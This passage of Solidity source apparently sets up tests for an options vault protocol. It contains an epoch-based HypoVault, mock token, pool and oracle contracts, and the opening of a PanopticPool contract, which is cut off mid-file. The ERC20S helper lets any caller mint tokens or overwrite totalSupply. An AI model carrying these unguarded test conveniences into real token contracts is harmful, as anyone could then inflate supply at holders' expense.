contract ERC20S {
    /*//////////////////////////////////////////////////////////////
                                 EVENTS
    //////////////////////////////////////////////////////////////*/

    event Transfer(address indexed from, address indexed to, uint256 amount);

    event Approval(address indexed owner, address indexed spender, uint256 amount);

    /*//////////////////////////////////////////////////////////////
                            METADATA STORAGE
    //////////////////////////////////////////////////////////////*/

    string public name;

    string public symbol;

    uint8 public immutable decimals;

    /*//////////////////////////////////////////////////////////////
                              ERC20 STORAGE
    //////////////////////////////////////////////////////////////*/

    uint256 public totalSupply;

    uint256 totalSupplyReal;

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    /*//////////////////////////////////////////////////////////////
                               CONSTRUCTOR
    //////////////////////////////////////////////////////////////*/

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function editSupply(uint256 newSupply) external {
        totalSupply = newSupply;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    /*//////////////////////////////////////////////////////////////
                               ERC20 LOGIC
    //////////////////////////////////////////////////////////////*/

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        allowance[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);

        return true;
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        balanceOf[msg.sender] -= amount;

        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }

        emit Transfer(msg.sender, to, amount);

        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.

        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;

        balanceOf[from] -= amount;

        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }

        emit Transfer(from, to, amount);

        return true;
    }

    /*//////////////////////////////////////////////////////////////
                        INTERNAL MINT/BURN LOGIC
    //////////////////////////////////////////////////////////////*/

    function _mint(address to, uint256 amount) internal virtual {
        totalSupplyReal += amount;

        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }

        emit Transfer(address(0), to, amount);
    }

    function _burn(address from, uint256 amount) internal virtual {
        balanceOf[from] -= amount;

        // Cannot underflow because a user's balance
        // will never be larger than the total supply.
        unchecked {
            totalSupplyReal -= amount;
        }

        emit Transfer(from, address(0), amount);
    }
}

contract HypoVault is ERC20Minimal, Multicall, Ownable {
    using Math_2 for uint256;
    using Address for address;
    /*//////////////////////////////////////////////////////////////
                                 TYPES
    //////////////////////////////////////////////////////////////*/

    /// @notice A type that represents an unfulfilled or partially fulfilled withdrawal.
    /// @param amount The amount of shares requested
    /// @param basis The amount of assets used to mint the shares requested
    struct PendingWithdrawal {
        uint128 amount;
        uint128 basis;
    }

    /// @notice A type that represents the state of a deposit epoch.
    /// @param assetsDeposited The amount of assets deposited
    /// @param sharesReceived The amount of shares received over `assetsFulfilled`
    /// @param assetsFulfilled The amount of assets fulfilled (out of `assetsDeposited`)
    struct DepositEpochState {
        uint128 assetsDeposited;
        uint128 sharesReceived;
        uint128 assetsFulfilled;
    }

    /// @notice A type that represents the state of a withdrawal epoch.
    /// @param sharesWithdrawn The amount of shares withdrawn
    /// @param assetsReceived The amount of assets received over `sharesFulfilled`
    /// @param sharesFulfilled The amount of shares fulfilled (out of `sharesWithdrawn`)
    struct WithdrawalEpochState {
        uint128 sharesWithdrawn;
        uint128 assetsReceived;
        uint128 sharesFulfilled;
    }

    /*//////////////////////////////////////////////////////////////
                                 EVENTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Emitted when a deposit is requested.
    /// @param user The address that requested the deposit
    /// @param assets The amount of assets requested
    event DepositRequested(address indexed user, uint256 assets);

    /// @notice Emitted when a withdrawal is requested.
    /// @param user The address that requested the withdrawal
    /// @param shares The amount of shares requested
    event WithdrawalRequested(address indexed user, uint256 shares);

    /// @notice Emitted when a deposit is cancelled.
    /// @param user The address that requested the deposit
    /// @param assets The amount of assets requested
    event DepositCancelled(address indexed user, uint256 assets);

    /// @notice Emitted when a withdrawal is cancelled.
    /// @param user The address that requested the withdrawal
    /// @param shares The amount of shares requested
    event WithdrawalCancelled(address indexed user, uint256 shares);

    /// @notice Emitted when a deposit is executed.
    /// @param user The address that requested the deposit
    /// @param assets The amount of assets executed
    /// @param shares The amount of shares received
    /// @param epoch The epoch in which the deposit was executed
    event DepositExecuted(address indexed user, uint256 assets, uint256 shares, uint256 epoch);

    /// @notice Emitted when a withdrawal is executed.
    /// @param user The address that requested the withdrawal
    /// @param shares The amount of shares executed
    /// @param assets The amount of assets received
    /// @param performanceFee The amount of performance fee received
    /// @param epoch The epoch in which the withdrawal was executed
    event WithdrawalExecuted(
        address indexed user,
        uint256 shares,
        uint256 assets,
        uint256 performanceFee,
        uint256 epoch
    );

    /// @notice Emitted when deposits are fulfilled.
    /// @param nextEpoch The epoch in which the deposits were fulfilled
    /// @param assetsFulfilled The amount of assets fulfilled
    /// @param sharesReceived The amount of shares received
    event DepositsFulfilled(
        uint256 indexed nextEpoch,
        uint256 assetsFulfilled,
        uint256 sharesReceived
    );

    /// @notice Emitted when withdrawals are fulfilled.
    /// @param nextEpoch The epoch in which the next withdrawals will be fulfilled
    /// @param assetsReceived The amount of assets received
    /// @param sharesFulfilled The amount of shares fulfilled
    event WithdrawalsFulfilled(
        uint256 indexed nextEpoch,
        uint256 assetsReceived,
        uint256 sharesFulfilled
    );

    /*//////////////////////////////////////////////////////////////
                                 ERRORS
    //////////////////////////////////////////////////////////////*/

    /// @notice Only the vault manager is authorized to call this function
    error NotManager();

    /// @notice The requested epoch in which to execute a deposit or withdrawal has not yet been fulfilled
    error EpochNotFulfilled();

    /// @notice The withdrawal fulfillment exceeds the maximum amount of assets that can be received
    error WithdrawalNotFulfillable();

    /*//////////////////////////////////////////////////////////////
                                STORAGE
    //////////////////////////////////////////////////////////////*/

    /// @notice Token used to denominate deposits and withdrawals.
    address public immutable underlyingToken;

    /// @notice Performance fee, in basis points, taken on each profitable withdrawal.
    uint256 public immutable performanceFeeBps;

    /// @notice Wallet that receives the performance fee.
    address public feeWallet;

    /// @notice Account authorized to execute deposits, withdrawals, and make arbitrary function calls from the vault.
    address public manager;

    /// @notice Contract that reports the net asset value of the vault.
    IVaultAccountant public accountant;

    /// @notice Epoch number for which withdrawals are currently being executed.
    uint128 public withdrawalEpoch;

    /// @notice Epoch number for which deposits are currently being executed.
    uint128 public depositEpoch;

    /// @notice Assets in the vault reserved for fulfilled withdrawal requests.
    uint256 public reservedWithdrawalAssets;

    /// @notice Contains information about the quantity of assets requested and fulfilled for deposits in each epoch.
    mapping(uint256 epoch => DepositEpochState) public depositEpochState;

    /// @notice Contains information about the quantity of shares requested and fulfilled for withdrawals in each epoch.
    mapping(uint256 epoch => WithdrawalEpochState) public withdrawalEpochState;

    /// @notice Records the state of a deposit request for a user in a given epoch.
    mapping(address user => mapping(uint256 epoch => uint128 depositAmount)) public queuedDeposit;

    /// @notice Records the state of a withdrawal request for a user in a given epoch.
    mapping(address user => mapping(uint256 epoch => PendingWithdrawal queue))
        public queuedWithdrawal;

    /// @notice Records the cost basis of a user's shares for the purpose of calculating performance fees.
    mapping(address user => uint256 basis) public userBasis;

    /// @notice Initializes the vault.
    /// @param _underlyingToken The token used to denominate deposits and withdrawals.
    /// @param _manager The account authorized to execute deposits, withdrawals, and make arbitrary function calls from the vault.
    /// @param _accountant The contract that reports the net asset value of the vault.
    /// @param _performanceFeeBps The performance fee, in basis points, taken on each profitable withdrawal.
    constructor(
        address _underlyingToken,
        address _manager,
        IVaultAccountant _accountant,
        uint256 _performanceFeeBps
    ) {
        underlyingToken = _underlyingToken;
        manager = _manager;
        accountant = _accountant;
        performanceFeeBps = _performanceFeeBps;
        totalSupply = 1_000_000;
    }

    /*//////////////////////////////////////////////////////////////
                                  AUTH
    //////////////////////////////////////////////////////////////*/

    /// @notice Modifier that restricts access to only the manager.
    modifier onlyManager() {
        if (msg.sender != manager) revert NotManager();
        _;
    }

    /// @notice Sets the manager.
    /// @dev Can only be called by the owner.
    /// @param _manager The new manager.
    function setManager(address _manager) external onlyOwner {
        manager = _manager;
    }

    /// @notice Sets the accountant.
    /// @dev Can only be called by the owner.
    /// @param _accountant The new accountant.
    function setAccountant(IVaultAccountant _accountant) external onlyOwner {
        accountant = _accountant;
    }

    /// @notice Sets the wallet that receives the performance fee.
    /// @dev Can only be called by the owner.
    /// @param _feeWallet The new fee wallet.
    function setFeeWallet(address _feeWallet) external onlyOwner {
        feeWallet = _feeWallet;
    }

    /*//////////////////////////////////////////////////////////////
                          DEPOSIT/REDEEM LOGIC
    //////////////////////////////////////////////////////////////*/

    /// @notice Requests a deposit of assets.
    /// @param assets The amount of assets to deposit
    function requestDeposit(uint128 assets) external {
        uint256 currentEpoch = depositEpoch;

        queuedDeposit[msg.sender][currentEpoch] += assets;

        depositEpochState[currentEpoch].assetsDeposited += assets;

        SafeTransferLib.safeTransferFrom(underlyingToken, msg.sender, address(this), assets);

        emit DepositRequested(msg.sender, assets);
    }

    /// @notice Requests a withdrawal of shares.
    /// @param shares The amount of shares to withdraw
    function requestWithdrawal(uint128 shares) external {
        uint256 _withdrawalEpoch = withdrawalEpoch;

        PendingWithdrawal memory pendingWithdrawal = queuedWithdrawal[msg.sender][_withdrawalEpoch];

        uint256 previousBasis = userBasis[msg.sender];

        uint256 userBalance = balanceOf[msg.sender];

        uint256 withdrawalBasis = (previousBasis * shares) / userBalance;

        userBasis[msg.sender] = previousBasis - withdrawalBasis;

        queuedWithdrawal[msg.sender][_withdrawalEpoch] = PendingWithdrawal({
            amount: pendingWithdrawal.amount + shares,
            basis: uint128(pendingWithdrawal.basis + withdrawalBasis)
        });

        withdrawalEpochState[_withdrawalEpoch].sharesWithdrawn += shares;

        _burnVirtual(msg.sender, shares);

        emit WithdrawalRequested(msg.sender, shares);
    }

    /// @notice Cancels a deposit in the current (unfulfilled) epoch.
    /// @dev Can only be called by the manager.
    /// @dev If deposited funds in previous epochs have not been completely fulfilled, the manager can execute those deposits to move the unfulfilled amount to the current epoch.
    /// @param depositor The address that requested the deposit
    function cancelDeposit(address depositor) external onlyManager {
        uint256 currentEpoch = depositEpoch;

        uint256 queuedDepositAmount = queuedDeposit[depositor][currentEpoch];
        queuedDeposit[depositor][currentEpoch] = 0;

        depositEpochState[currentEpoch].assetsDeposited -= uint128(queuedDepositAmount);

        SafeTransferLib.safeTransfer(underlyingToken, depositor, queuedDepositAmount);

        emit DepositCancelled(depositor, queuedDepositAmount);
    }

    /// @notice Cancels a withdrawal in the current (unfulfilled) epoch.
    /// @dev Can only be called by the manager.
    /// @dev If withdrawn shares in previous epochs have not been completely fulfilled, the manager can execute those withdrawals to move the unfulfilled amount to the current epoch.
    /// @param withdrawer The address that requested the withdrawal
    function cancelWithdrawal(address withdrawer) external onlyManager {
        uint256 currentEpoch = withdrawalEpoch;

        PendingWithdrawal memory currentPendingWithdrawal = queuedWithdrawal[withdrawer][
            currentEpoch
        ];

        queuedWithdrawal[withdrawer][currentEpoch] = PendingWithdrawal({amount: 0, basis: 0});
        userBasis[withdrawer] += currentPendingWithdrawal.basis;

        withdrawalEpochState[currentEpoch].sharesWithdrawn -= currentPendingWithdrawal.amount;

        _mintVirtual(withdrawer, currentPendingWithdrawal.amount);

        emit WithdrawalCancelled(withdrawer, currentPendingWithdrawal.amount);
    }

    /// @notice Converts an active pending deposit into shares.
    /// @param user The address that requested the deposit
    /// @param epoch The epoch in which the deposit was requested
    function executeDeposit(address user, uint256 epoch) external {
        if (epoch >= depositEpoch) revert EpochNotFulfilled();

        uint256 queuedDepositAmount = queuedDeposit[user][epoch];
        queuedDeposit[user][epoch] = 0;

        DepositEpochState memory _depositEpochState = depositEpochState[epoch];

        uint256 userAssetsDeposited = Math_2.mulDiv(
            queuedDepositAmount,
            _depositEpochState.assetsFulfilled,
            _depositEpochState.assetsDeposited
        );

        uint256 sharesReceived = Math_2.mulDiv(
            userAssetsDeposited,
            _depositEpochState.sharesReceived,
            _depositEpochState.assetsFulfilled
        );

        // shares from pending deposits are already added to the supply at the start of every new epoch
        _mintVirtual(user, sharesReceived);

        userBasis[user] += userAssetsDeposited;

        queuedDeposit[user][epoch] = 0;

        uint256 assetsRemaining = queuedDepositAmount - userAssetsDeposited;

        // move remainder of deposit to next epoch -- unfulfilled assets in this epoch will be handled in the next epoch
        if (assetsRemaining > 0) queuedDeposit[user][epoch + 1] += uint128(assetsRemaining);

        emit DepositExecuted(user, userAssetsDeposited, sharesReceived, epoch);
    }

    /// @notice Converts an active pending withdrawal into assets.
    /// @param user The address that requested the withdrawal
    /// @param epoch The epoch in which the withdrawal was requested
    function executeWithdrawal(address user, uint256 epoch) external {
        if (epoch >= withdrawalEpoch) revert EpochNotFulfilled();

        PendingWithdrawal memory pendingWithdrawal = queuedWithdrawal[user][epoch];

        WithdrawalEpochState memory _withdrawalEpochState = withdrawalEpochState[epoch];

        // prorated shares to fulfill = amount * fulfilled shares / total shares withdrawn
        uint256 sharesToFulfill = (uint256(pendingWithdrawal.amount) *
            _withdrawalEpochState.sharesFulfilled) / _withdrawalEpochState.sharesWithdrawn;
        // assets to withdraw = prorated shares to withdraw * assets fulfilled / total shares fulfilled
        uint256 assetsToWithdraw = Math_2.mulDiv(
            sharesToFulfill,
            _withdrawalEpochState.assetsReceived,
            _withdrawalEpochState.sharesFulfilled
        );

        reservedWithdrawalAssets -= assetsToWithdraw;

        uint256 withdrawnBasis = (uint256(pendingWithdrawal.basis) *
            _withdrawalEpochState.sharesFulfilled) / _withdrawalEpochState.sharesWithdrawn;
        uint256 performanceFee = (uint256(
            Math_2.max(0, int256(assetsToWithdraw) - int256(withdrawnBasis))
        ) * performanceFeeBps) / 10_000;

        queuedWithdrawal[user][epoch] = PendingWithdrawal({amount: 0, basis: 0});

        uint256 sharesRemaining = pendingWithdrawal.amount - sharesToFulfill;

        uint256 basisRemaining = pendingWithdrawal.basis - withdrawnBasis;

        // move remainder of withdrawal to next epoch -- unfulfilled shares in this epoch will be handled in the next epoch
        if (sharesRemaining + basisRemaining > 0) {
            PendingWithdrawal memory nextQueuedWithdrawal = queuedWithdrawal[user][epoch + 1];
            queuedWithdrawal[user][epoch + 1] = PendingWithdrawal({
                amount: uint128(nextQueuedWithdrawal.amount + sharesRemaining),
                basis: uint128(nextQueuedWithdrawal.basis + basisRemaining)
            });
        }

        if (performanceFee > 0) {
            assetsToWithdraw -= performanceFee;
            SafeTransferLib.safeTransfer(underlyingToken, feeWallet, uint256(performanceFee));
        }

        SafeTransferLib.safeTransfer(underlyingToken, user, assetsToWithdraw);

        emit WithdrawalExecuted(user, sharesToFulfill, assetsToWithdraw, performanceFee, epoch);
    }

    /*//////////////////////////////////////////////////////////////
                               OVERRIDES
    //////////////////////////////////////////////////////////////*/

    /// @notice Override transfer to handle basis transfer.
    /// @param to The recipient of the shares
    /// @param amount The amount of shares to transfer
    /// @return success True if the transfer was successful
    function transfer(address to, uint256 amount) public override returns (bool success) {
        _transferBasis(msg.sender, to, amount);
        return super.transfer(to, amount);
    }

    /// @notice Override transferFrom to handle basis transfer.
    /// @param from The sender of the shares
    /// @param to The recipient of the shares
    /// @param amount The amount of shares to transfer
    /// @return success True if the transfer was successful
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool success) {
        _transferBasis(from, to, amount);
        return super.transferFrom(from, to, amount);
    }

    /// @notice Internal function to transfer basis proportionally with share transfers.
    /// @param from The sender of the shares
    /// @param to The recipient of the shares
    /// @param amount The amount of shares being transferred
    function _transferBasis(address from, address to, uint256 amount) internal {
        uint256 fromBalance = balanceOf[from];
        if (fromBalance == 0) return;

        uint256 fromBasis = userBasis[from];
        uint256 basisToTransfer = (fromBasis * amount) / fromBalance;

        userBasis[from] = fromBasis - basisToTransfer;
        userBasis[to] += basisToTransfer;
    }

    /*//////////////////////////////////////////////////////////////
                            VAULT MANAGEMENT
    //////////////////////////////////////////////////////////////*/

    /// @notice Makes an arbitrary function call from this contract.
    /// @dev Can only be called by the manager.
    function manage(
        address target,
        bytes calldata data,
        uint256 value
    ) external onlyManager returns (bytes memory result) {
        result = target.functionCallWithValue(data, value);
    }

    /// @notice Makes arbitrary function calls from this contract.
    /// @dev Can only be called by the manager.
    function manage(
        address[] calldata targets,
        bytes[] calldata data,
        uint256[] calldata values
    ) external onlyManager returns (bytes[] memory results) {
        uint256 targetsLength = targets.length;
        results = new bytes[](targetsLength);
        for (uint256 i; i < targetsLength; ++i) {
            results[i] = targets[i].functionCallWithValue(data[i], values[i]);
        }
    }

    /// @notice Fulfills deposit requests.
    /// @dev Can only be called by the manager.
    /// @param assetsToFulfill The amount of assets to fulfill
    /// @param managerInput If provided, an arbitrary input to the accountant contract
    function fulfillDeposits(
        uint256 assetsToFulfill,
        bytes memory managerInput
    ) external onlyManager {
        uint256 currentEpoch = depositEpoch;

        DepositEpochState memory epochState = depositEpochState[currentEpoch];

        uint256 totalAssets = accountant.computeNAV(address(this), underlyingToken, managerInput) +
            1 -
            epochState.assetsDeposited -
            reservedWithdrawalAssets;

        uint256 _totalSupply = totalSupply;

        uint256 sharesReceived = Math_2.mulDiv(assetsToFulfill, _totalSupply, totalAssets);

        uint256 assetsRemaining = epochState.assetsDeposited - assetsToFulfill;

        depositEpochState[currentEpoch] = DepositEpochState({
            assetsDeposited: uint128(epochState.assetsDeposited),
            sharesReceived: uint128(sharesReceived),
            assetsFulfilled: uint128(assetsToFulfill)
        });

        currentEpoch++;
        depositEpoch = uint128(currentEpoch);

        depositEpochState[currentEpoch] = DepositEpochState({
            assetsDeposited: uint128(assetsRemaining),
            sharesReceived: 0,
            assetsFulfilled: 0
        });

        totalSupply = _totalSupply + sharesReceived;

        emit DepositsFulfilled(currentEpoch, assetsToFulfill, sharesReceived);
    }

    /// @notice Fulfills withdrawal requests.
    /// @dev Can only be called by the manager.
    /// @param sharesToFulfill The amount of shares to fulfill
    /// @param maxAssetsReceived The maximum amount of assets the manager is willing to disburse
    /// @param managerInput If provided, an arbitrary input to the accountant contract
    function fulfillWithdrawals(
        uint256 sharesToFulfill,
        uint256 maxAssetsReceived,
        bytes memory managerInput
    ) external onlyManager {
        uint256 _reservedWithdrawalAssets = reservedWithdrawalAssets;
        uint256 totalAssets = accountant.computeNAV(address(this), underlyingToken, managerInput) +
            1 -
            depositEpochState[depositEpoch].assetsDeposited -
            _reservedWithdrawalAssets;

        uint256 currentEpoch = withdrawalEpoch;

        WithdrawalEpochState memory epochState = withdrawalEpochState[currentEpoch];

        uint256 _totalSupply = totalSupply;

        uint256 assetsReceived = Math_2.mulDiv(sharesToFulfill, totalAssets, _totalSupply);

        if (assetsReceived > maxAssetsReceived) revert WithdrawalNotFulfillable();

        uint256 sharesRemaining = epochState.sharesWithdrawn - sharesToFulfill;

        withdrawalEpochState[currentEpoch] = WithdrawalEpochState({
            assetsReceived: uint128(assetsReceived),
            sharesWithdrawn: uint128(epochState.sharesWithdrawn),
            sharesFulfilled: uint128(sharesToFulfill)
        });

        currentEpoch++;

        withdrawalEpoch = uint128(currentEpoch);

        withdrawalEpochState[currentEpoch] = WithdrawalEpochState({
            assetsReceived: 0,
            sharesWithdrawn: uint128(sharesRemaining),
            sharesFulfilled: 0
        });

        totalSupply = _totalSupply - sharesToFulfill;

        reservedWithdrawalAssets = _reservedWithdrawalAssets + assetsReceived;

        emit WithdrawalsFulfilled(currentEpoch, assetsReceived, sharesToFulfill);
    }

    /// @notice Internal utility to mint tokens to a user's account without updating the total supply.
    /// @param to The user to mint tokens to
    /// @param amount The amount of tokens to mint
    function _mintVirtual(address to, uint256 amount) internal {
        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }

        emit Transfer(address(0), to, amount);
    }

    /// @notice Internal utility to burn tokens from a user's account without updating the total supply.
    /// @param from The user to burn tokens from
    /// @param amount The amount of tokens to burn
    function _burnVirtual(address from, uint256 amount) internal {
        balanceOf[from] -= amount;

        emit Transfer(from, address(0), amount);
    }
}

interface IERC20Partial {
    /// @notice Returns the amount of tokens owned by `account`.
    /// @dev This function is unchanged from the EIP.
    /// @param account The address to query the balance of
    /// @return The amount of tokens owned by `account`
    function balanceOf(address account) external view returns (uint256);

    /// @notice Sets `amount` as the allowance of `spender` over the caller's tokens.
    /// @dev While this function is specified to return a boolean value in the EIP, this interface does not expect one.
    /// @param spender The address which will spend the funds
    /// @param amount The amount of tokens allowed to be spent
    function approve(address spender, uint256 amount) external;

    /// @notice Transfers tokens from the caller to another user.
    /// @param to The user to transfer tokens to
    /// @param amount The amount of tokens to transfer
    function transfer(address to, uint256 amount) external;

    /// @notice Returns the amount of tokens in existence.
    function totalSupply() external view returns (uint256);
}

interface IVaultAccountant {
    /// @notice Returns the NAV of the portfolio contained in `vault` in terms of its underlying token
    /// @param vault The address of the vault to value
    /// @param underlyingToken The underlying token of the vault
    /// @param managerInput Additional input from the vault manager to be used in the accounting process, if applicable
    function computeNAV(
        address vault,
        address underlyingToken,
        bytes memory managerInput
    ) external view returns (uint256);
}

contract MockERC20Partial is IERC20Partial {
    mapping(address => uint256) public balances;
    string public name;
    string public symbol;
    uint256 public _totalSupply;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balances[to] += amount;
        _totalSupply += amount;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return balances[account];
    }

    function setBalance(address account, uint256 amount) external {
        balances[account] = amount;
    }

    function approve(address, uint256) external override {
        // Mock implementation
    }

    function transfer(address, uint256) external override {
        // Mock implementation
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}

contract MockPanopticPool {
    MockCollateralToken public collateralToken0;
    MockCollateralToken public collateralToken1;
    mapping(address => uint256) public numberOfLegsMapping;
    LeftRightUnsigned public mockShortPremium;
    LeftRightUnsigned public mockLongPremium;
    uint256[2][] public mockPositionBalanceArray;

    // Additional state for more comprehensive testing
    mapping(address => mapping(uint256 => bool)) public positionExists;
    mapping(address => uint256) public totalPositions;

    constructor() {
        collateralToken0 = new MockCollateralToken();
        collateralToken1 = new MockCollateralToken();
    }

    function numberOfLegs(address vault) external view returns (uint256) {
        return numberOfLegsMapping[vault];
    }

    function setNumberOfLegs(address vault, uint256 legs) external {
        numberOfLegsMapping[vault] = legs;
    }

    function getAccumulatedFeesAndPositionsData(
        address,
        bool,
        TokenId[] memory
    )
        external
        view
        returns (
            LeftRightUnsigned shortPremium,
            LeftRightUnsigned longPremium,
            uint256[2][] memory positionBalanceArray
        )
    {
        return (mockShortPremium, mockLongPremium, mockPositionBalanceArray);
    }

    function setMockPremiums(
        LeftRightUnsigned _shortPremium,
        LeftRightUnsigned _longPremium
    ) external {
        mockShortPremium = _shortPremium;
        mockLongPremium = _longPremium;
    }

    function setMockPositionBalanceArray(uint256[2][] memory _array) external {
        delete mockPositionBalanceArray;
        for (uint i = 0; i < _array.length; i++) {
            mockPositionBalanceArray.push(_array[i]);
        }
    }

    function addPosition(address vault, uint256 positionId) external {
        positionExists[vault][positionId] = true;
        totalPositions[vault]++;
    }

    function removePosition(address vault, uint256 positionId) external {
        if (positionExists[vault][positionId]) {
            positionExists[vault][positionId] = false;
            totalPositions[vault]--;
        }
    }

    function hasPosition(address vault, uint256 positionId) external view returns (bool) {
        return positionExists[vault][positionId];
    }
}

contract MockV3CompatibleOracle is IV3CompatibleOracle {
    int56[] public tickCumulatives;
    uint160[] public sqrtPriceX96s;
    uint32 public windowSize;
    int24 public currentTick;
    uint160 public currentSqrtPriceX96;
    uint16 public currentObservationCardinality;

    constructor() {
        // Default tick cumulatives for a 20-slot observation
        for (uint i = 0; i < 20; i++) {
            tickCumulatives.push(int56(int256(1000 + i * 100))); // Increasing tick cumulatives
        }
        windowSize = 600; // 10 minutes
        currentTick = 100;
        currentSqrtPriceX96 = Math_2.getSqrtRatioAtTick(currentTick);
        currentObservationCardinality = 20;
    }

    function observe(
        uint32[] memory secondsAgos
    ) external view override returns (int56[] memory, uint160[] memory) {
        int56[] memory ticks = new int56[](secondsAgos.length);
        uint160[] memory prices = new uint160[](secondsAgos.length);

        for (uint i = 0; i < secondsAgos.length; i++) {
            if (i < tickCumulatives.length) {
                ticks[i] = tickCumulatives[i];
            } else {
                ticks[i] = tickCumulatives[tickCumulatives.length - 1];
            }
            prices[i] = Math_2.getSqrtRatioAtTick(int24(ticks[i] / 100));
        }

        return (ticks, prices);
    }

    function slot0()
        external
        view
        override
        returns (
            uint160 sqrtPriceX96,
            int24 tick,
            uint16 observationIndex,
            uint16 observationCardinality,
            uint16 observationCardinalityNext,
            uint8 feeProtocol,
            bool unlocked
        )
    {
        return (
            currentSqrtPriceX96,
            currentTick,
            0,
            currentObservationCardinality,
            currentObservationCardinality,
            0,
            true
        );
    }

    function observations(
        uint256
    )
        external
        view
        override
        returns (
            uint32 blockTimestamp,
            int56 tickCumulative,
            uint160 secondsPerLiquidityCumulativeX128,
            bool initialized
        )
    {
        return (uint32(block.timestamp), 0, 0, true);
    }

    function increaseObservationCardinalityNext(uint16) external override {
        // Mock implementation - do nothing
    }

    function setTickCumulatives(int56[] memory _tickCumulatives) external {
        delete tickCumulatives;
        for (uint i = 0; i < _tickCumulatives.length; i++) {
            tickCumulatives.push(_tickCumulatives[i]);
        }
    }

    function setObservation(uint256 index, int56 tickCumulative, uint160 sqrtPriceX96) external {
        if (index >= tickCumulatives.length) {
            for (uint i = tickCumulatives.length; i <= index; i++) {
                tickCumulatives.push(0);
                sqrtPriceX96s.push(0);
            }
        }
        tickCumulatives[index] = tickCumulative;
        sqrtPriceX96s[index] = sqrtPriceX96;
    }

    function setCurrentState(
        int24 tick,
        uint160 sqrtPriceX96,
        uint16 observationCardinality
    ) external {
        currentTick = tick;
        currentSqrtPriceX96 = sqrtPriceX96;
        currentObservationCardinality = observationCardinality;
    }
}

contract PanopticPool is Clone, Multicall {
    /*//////////////////////////////////////////////////////////////
                                EVENTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Emitted when an account is liquidated.
    /// @param liquidator Address of the caller liquidating the distressed account
    /// @param liquidatee Address of the distressed/liquidatable account
    /// @param bonusAmounts LeftRight encoding for the the bonus paid for currency 0 (right slot) and 1 (left slot) to the liquidator
    event AccountLiquidated(
        address indexed liquidator,
        address indexed liquidatee,
        LeftRightSigned bonusAmounts
    );

    /// @notice Emitted when a position is force exercised.
    /// @param exercisor Address of the account that forces the exercise of the position
    /// @param user Address of the owner of the liquidated position
    /// @param tokenId TokenId of the liquidated position
    /// @param exerciseFee LeftRight encoding for the cost paid by the exercisor to force the exercise of the token;
    /// the cost for currency 0 (right slot) and 1 (left slot) is represented as negative
    event ForcedExercised(
        address indexed exercisor,
        address indexed user,
        TokenId indexed tokenId,
        LeftRightSigned exerciseFee
    );

    /// @notice Emitted when premium is settled independent of a mint/burn (e.g. during `settleLongPremium`).
    /// @param user Address of the owner of the settled position
    /// @param tokenId TokenId of the settled position
    /// @param legIndex The leg index of `tokenId` that the premium was settled for
    /// @param settledAmounts LeftRight encoding for the amount of premium settled for currency0 (right slot) and currency1 (left slot)
    event PremiumSettled(
        address indexed user,
        TokenId indexed tokenId,
        uint256 legIndex,
        LeftRightSigned settledAmounts
    );

    /// @notice Emitted when an option is burned.
    /// @param recipient User that burnt the option
    /// @param positionSize The number of contracts burnt, expressed in terms of the asset
    /// @param tokenId TokenId of the burnt option
    /// @param premiaByLeg LeftRight packing for the amount of premia collected for currency0 (right) and currency1 (left) for each leg of `tokenId`
    event OptionBurnt(
        address indexed recipient,
        uint128 positionSize,
        TokenId indexed tokenId,
        LeftRightSigned[4] premiaByLeg
    );

    /// @notice Emitted when an option is minted.
    /// @param recipient User that minted the option
    /// @param tokenId TokenId of the created option
    /// @param balanceData The `PositionBalance` data for `tokenId` containing the number of contracts, pool utilizations, and ticks at mint
    /// @param commissions The total amount of commissions (base rate + ITM spread) paid for token0 (right) and token1 (left)
    event OptionMinted(
        address indexed recipient,
        TokenId indexed tokenId,
        PositionBalance balanceData,
        LeftRightUnsigned commissions
    );

    /*//////////////////////////////////////////////////////////////
                         IMMUTABLES & CONSTANTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Lower price bound used when no slippage check is required.
    int24 internal constant MIN_SWAP_TICK = Constants.MIN_V4POOL_TICK - 1;

    /// @notice Upper price bound used when no slippage check is required.
    int24 internal constant MAX_SWAP_TICK = Constants.MAX_V4POOL_TICK + 1;

    /// @notice Flag that signals to compute premia for both the short and long legs of a position.
    bool internal constant COMPUTE_PREMIA_AS_COLLATERAL = true;

    /// @notice Flag that indicates only to include the share of (settled) premium that is available to collect when calling `_calculateAccumulatedPremia`.
    bool internal constant ONLY_AVAILABLE_PREMIUM = false;

    /// @notice Flag that signals to commit both collected Uniswap fees and settled long premium to `s_settledTokens`.
    bool internal constant COMMIT_LONG_SETTLED = true;
    /// @notice Flag that signals to only commit collected Uniswap fees to `s_settledTokens`.
    bool internal constant DONOT_COMMIT_LONG_SETTLED = false;

    /// @notice Flag for `_checkSolvency` to indicate that an account should be solvent at all input ticks.
    bool internal constant ASSERT_SOLVENCY = true;

    /// @notice Flag for `_checkSolvency` to indicate that an account should be insolvent at all input ticks.
    bool internal constant ASSERT_INSOLVENCY = false;

    /// @notice Flag that signals to add a new position to the user's positions hash (as opposed to removing an existing position).
    bool internal constant ADD = true;

    /// @notice The minimum window (in seconds) used to calculate the TWAP price for solvency checks during liquidations.
    uint32 internal constant TWAP_WINDOW = 600;

